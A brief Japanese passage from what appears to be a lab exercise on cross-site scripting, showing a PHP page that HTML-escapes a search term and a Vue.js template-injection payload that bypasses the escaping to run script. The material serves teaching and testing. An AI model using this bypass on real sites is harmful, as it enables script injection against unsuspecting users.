## 攻撃方法

演習環境を `docker-compose up` で起動します。

`index.php` では次のようにHTMLエスケープを施して検索キーワードを表示しています。

```php
<div id="app">
  <div>
    検索キーワード：
    <?= htmlspecialchars((string) $_GET['search']) ?>
  </div>
</div>
```

検索キーワード欄に `<script>alert(1)</script>` などを入力してもHTMLエスケープされるのでXSSは生じません。

しかし、 `{{ constructor.constructor("alert(1)")()  }}` を入力すると VueJS のテンプレートと解釈され、XSSが生じます。

